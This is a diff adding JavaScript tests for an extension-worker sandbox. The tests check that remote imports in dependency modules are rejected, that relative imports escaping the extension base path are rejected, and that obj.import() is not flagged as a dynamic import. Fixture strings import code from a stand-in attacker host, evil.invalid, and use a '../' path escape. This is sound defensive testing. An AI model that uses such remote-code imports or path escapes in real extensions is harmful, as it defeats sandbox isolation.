@@ -310,6 +310,58 @@ test("extension-worker: rejects absolute-path imports", async () => {
   }
 });
 
+test("extension-worker: rejects disallowed imports in dependency modules", async () => {
+  const dir = await createTempDir("formula-ext-worker-dep-disallowed-import-");
+  try {
+    await writeFiles(dir, {
+      "main.mjs": `import "./dep.mjs";\nexport async function activate() {}\n`,
+      "dep.mjs": `import "https://evil.invalid/evil.mjs";\nexport const x = 1;\n`
+    });
+    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
+    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;
+
+    await assert.rejects(
+      () => activateExtensionWorker({ mainUrl, extensionPath }),
+      /Disallowed import specifier 'https:\/\/evil\.invalid\/evil\.mjs'/i
+    );
+  } finally {
+    await fs.rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("extension-worker: rejects relative imports that escape the extension base URL", async () => {
+  const dir = await createTempDir("formula-ext-worker-escape-relative-import-");
+  try {
+    await writeFiles(dir, {
+      "main.mjs": `import "../outside.mjs";\nexport async function activate() {}\n`
+    });
+    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
+    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;
+
+    await assert.rejects(
+      () => activateExtensionWorker({ mainUrl, extensionPath }),
+      /resolved outside the extension base URL/i
+    );
+  } finally {
+    await fs.rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("extension-worker: does not treat obj.import(...) as dynamic import", async () => {
+  const dir = await createTempDir("formula-ext-worker-import-prop-");
+  try {
+    await writeFiles(dir, {
+      "main.mjs": `export async function activate() {\n  const obj = { import: (value) => value };\n  obj.import("https://evil.invalid/evil.mjs");\n}\n`
+    });
+    const mainUrl = pathToFileURL(path.join(dir, "main.mjs")).href;
+    const extensionPath = pathToFileURL(`${dir}${path.sep}`).href;
+
+    await activateExtensionWorker({ mainUrl, extensionPath });
+  } finally {
+    await fs.rm(dir, { recursive: true, force: true });
+  }
+});
+
 test("extension-worker: allows relative import graphs", async () => {
   const dir = await createTempDir("formula-ext-worker-relative-import-");
   try {
